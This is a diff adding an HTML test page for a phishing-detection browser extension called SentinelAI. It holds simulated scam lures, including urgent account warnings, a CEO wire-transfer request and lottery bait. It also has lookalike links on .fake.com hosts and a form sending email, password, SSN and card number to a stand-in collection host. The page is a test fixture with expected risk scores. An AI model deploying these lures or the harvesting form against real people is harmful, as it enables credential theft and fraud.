@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SentinelAI Test Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .test-section {
+            border: 1px solid #ddd;
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        .high-risk { background-color: #ffebee; }
+        .medium-risk { background-color: #fff3e0; }
+        .low-risk { background-color: #e8f5e8; }
+        .suspicious-link {
+            color: #d32f2f;
+            text-decoration: underline;
+        }
+        form {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 6px;
+        }
+        input, button {
+            margin: 5px 0;
+            padding: 8px;
+            width: 200px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🛡️ SentinelAI Test Page</h1>
+    <p>This page contains various elements to test SentinelAI's threat detection capabilities.</p>
+
+    <div class="warning">
+        <strong>⚠️ Testing Purpose Only</strong><br>
+        This page contains simulated phishing content for testing. Do not enter real credentials.
+    </div>
+
+    <!-- High Risk Content -->
+    <div class="test-section high-risk">
+        <h2>🚨 High Risk Content</h2>
+        <p><strong>URGENT ACTION REQUIRED!</strong> Your account has been suspended due to suspicious activity.</p>
+        <p>Dear CEO, we need you to wire transfer $50,000 immediately for an urgent business expense.</p>
+        <p>CONGRATULATIONS WINNER! You have won $1,000,000 in our lottery. Click here now to claim your prize!</p>
+        <p>Verify your account immediately or it will be permanently deleted. Limited time offer expires in 1 hour!</p>
+
+        <a href="http://payp4l-security.fake.com/verify" class="suspicious-link">Verify PayPal Account</a><br>
+        <a href="http://amazon-security.fake.com/update" class="suspicious-link">Update Amazon Payment</a><br>
+        <a href="http://microsoft-office.fake.com/login" class="suspicious-link">Microsoft Office Login</a>
+    </div>
+
+    <!-- Medium Risk Content -->
+    <div class="test-section medium-risk">
+        <h2>⚠️ Medium Risk Content</h2>
+        <p>Please update your payment information to continue using our service.</p>
+        <p>There has been an unusual login attempt on your account from a new device.</p>
+        <p>Your subscription expires soon. Renew now to avoid service interruption.</p>
+
+        <a href="https://bit.ly/fake-link">Shortened Link Example</a><br>
+        <a href="javascript:alert('suspicious')">Suspicious JavaScript Link</a>
+    </div>
+
+    <!-- Suspicious Forms -->
+    <div class="test-section">
+        <h2>📝 Form Testing</h2>
+
+        <h3>High Risk Form (External Action)</h3>
+        <form action="http://malicious-site.fake.com/collect" method="POST">
+            <p>Enter your credentials to verify your account:</p>
+            <input type="email" name="email" placeholder="Your Email" required><br>
+            <input type="password" name="password" placeholder="Your Password" required><br>
+            <input type="text" name="ssn" placeholder="Social Security Number"><br>
+            <input type="text" name="credit-card" placeholder="Credit Card Number"><br>
+            <button type="submit">Submit Credentials</button>
+        </form>
+
+        <h3>Medium Risk Form (Sensitive Fields)</h3>
+        <form>
+            <p>Newsletter signup:</p>
+            <input type="email" name="newsletter" placeholder="Email for Newsletter"><br>
+            <input type="tel" name="phone" placeholder="Phone Number"><br>
+            <button type="submit">Sign Up</button>
+        </form>
+    </div>
+
+    <!-- Low Risk Content -->
+    <div class="test-section low-risk">
+        <h2>✅ Low Risk Content</h2>
+        <p>Welcome to our website! We're glad you're here.</p>
+        <p>Check out our latest blog posts and product updates.</p>
+        <p>Contact us if you have any questions about our services.</p>
+
+        <a href="https://github.com">GitHub</a><br>
+        <a href="https://google.com">Google</a><br>
+        <a href="mailto:info@example.com">Contact Us</a>
+    </div>
+
+    <!-- Mixed Content for Comprehensive Testing -->
+    <div class="test-section">
+        <h2>🔬 Comprehensive Test Section</h2>
+
+        <h3>Grammar and Spelling Errors</h3>
+        <p>You're account has been comprimised. Please recieve our urgent email and occured immediately.</p>
+
+        <h3>Authority Impersonation</h3>
+        <p>From: CFO Johnson<br>
+        Subject: Urgent CEO Request - Wire Transfer Needed ASAP</p>
+
+        <h3>Multiple Threat Indicators</h3>
+        <p>URGENT!!! Your PayPal account will be suspended in 24 hours! Click here immediately to verify your account and update your payment information. This is a limited time offer from our CEO.</p>
+
+        <h3>Images (Placeholder for Computer Vision Testing)</h3>
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIGZpbGw9IiNmZjAwMDAiLz4KPHRleHQgeD0iNTAiIHk9IjUwIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjNlbSI+RmFrZSBMb2dvPC90ZXh0Pgo8L3N2Zz4K" alt="Fake Logo" width="100" height="100">
+
+        <h3>Suspicious URL Parameters</h3>
+        <a href="?urgent=true&verify=account&suspended=yes&action=required">Link with Suspicious Parameters</a>
+    </div>
+
+    <!-- JavaScript for Dynamic Content Testing -->
+    <script>
+        // Add some dynamic content after page load
+        setTimeout(() => {
+            const dynamicContent = document.createElement('div');
+            dynamicContent.className = 'test-section high-risk';
+            dynamicContent.innerHTML = `
+                <h3>🔄 Dynamic Content Test</h3>
+                <p>This content was added dynamically. URGENT: Please verify your account immediately!</p>
+                <a href="http://fake-bank.com/urgent">Dynamic Suspicious Link</a>
+            `;
+            document.body.appendChild(dynamicContent);
+            console.log('SentinelAI Test: Dynamic content added');
+        }, 3000);
+
+        // Test console logging
+        console.log('SentinelAI Test Page Loaded');
+        console.log('Monitor the SentinelAI extension for threat detection...');
+    </script>
+
+    <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd;">
+        <h3>🧪 Testing Instructions</h3>
+        <ol>
+            <li>Load this page with SentinelAI extension installed</li>
+            <li>Watch for the floating risk indicator (🛡️) to appear</li>
+            <li>Click the SentinelAI extension icon to open the dashboard</li>
+            <li>Click "🔍 Scan Current Page" to force a manual scan</li>
+            <li>Check the risk score and detected threats</li>
+            <li>Test different sensitivity settings</li>
+            <li>Verify notifications appear for high-risk content</li>
+            <li>Check browser console (F12) for SentinelAI logs</li>
+        </ol>
+
+        <p><strong>Expected Results:</strong></p>
+        <ul>
+            <li>Risk Score: 70-90 (High Risk)</li>
+            <li>Detected Threats: Multiple categories including urgency, authority impersonation, credential harvesting</li>
+            <li>Warnings: Should appear for high-risk sections</li>
+            <li>Activity Log: Should record this page analysis</li>
+        </ul>
+    </footer>
+</body>
+</html>
